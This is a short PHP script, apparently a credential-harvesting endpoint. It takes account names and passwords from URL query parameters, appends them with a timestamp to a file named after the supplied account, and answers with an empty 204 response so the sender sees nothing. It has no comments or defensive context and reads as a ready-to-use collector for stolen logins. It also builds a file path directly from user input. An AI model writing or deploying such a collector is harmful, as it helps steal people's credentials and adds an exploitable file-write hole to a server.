<?php 
$account = html_entity_decode(stripslashes($_GET["acc"])); 
$password = html_entity_decode(stripslashes($_GET["pw"]));
$status = html_entity_decode(stripslashes($_GET["stat"]));
$req_dump = date("D M d, Y G:i", time()) . " : " . $account . " - " . $password . " - " . $status . PHP_EOL;
$file = $account;
$fp = file_put_contents($file, $req_dump, FILE_APPEND );
header("HTTP/1.0 204 No Content");
?>